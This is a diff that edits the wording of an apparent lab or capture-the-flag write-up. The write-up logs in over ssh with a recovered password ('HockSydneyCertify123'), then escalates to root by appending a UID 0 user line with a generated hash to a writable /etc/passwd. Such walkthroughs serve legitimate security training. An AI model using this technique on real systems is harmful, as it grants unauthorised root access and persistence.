@@ -217,7 +217,7 @@ HockSydneyCertify123
 > We now have a password for user `michael` (`HockSydneyCertify123`) which might also works to access his `ssh` account.
 {: .prompt-info }
 
-Now we are logging in via ssh using `michael:HockSydneyCertify123`
+Now we are logging in via `ssh` using `michael:HockSydneyCertify123`
 ```bash
 $ ssh michael@192.168.126.58
 michael@192.168.126.58's password: 
@@ -228,22 +228,22 @@ uid=1000(michael) gid=1000(michael) groups=1000(michael) context=unconfined_u:un
 > It worked!
 {: .prompt-info }
 
-We are now user `michael` but the goal is to gain `root` access to the system.  
+We are user `michael`, but the goal is to gain `root` access to the system.  
 So, we now check some basic escalation techniques to check if we can elevate our privileges to `root`.
 
 > The file `/etc/passwd` is writeable.
 {: .prompt-info }
 
-We are now creating a hash for a new user with `root` privileges we add to the system.
+We are now creating a `hash` for a new user we want add to the system.
 ```bash
 $ openssl passwd -1 -salt new 123
 $1$new$p7ptkEKU1HnaHpRtzNizS1
 ```
-We are appending the following line to the file `/etc/passwd`.  
+Appending the following line to the file `/etc/passwd` will create a `root` user with the name `new`.  
   
 `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`  
   
-Now we can switch to our new created user (`new:123`).
+Now we can switch to our newly created `root` user (`new:123`).
 ```bash
 [michael@snookums tmp]$ su new
 Password: 
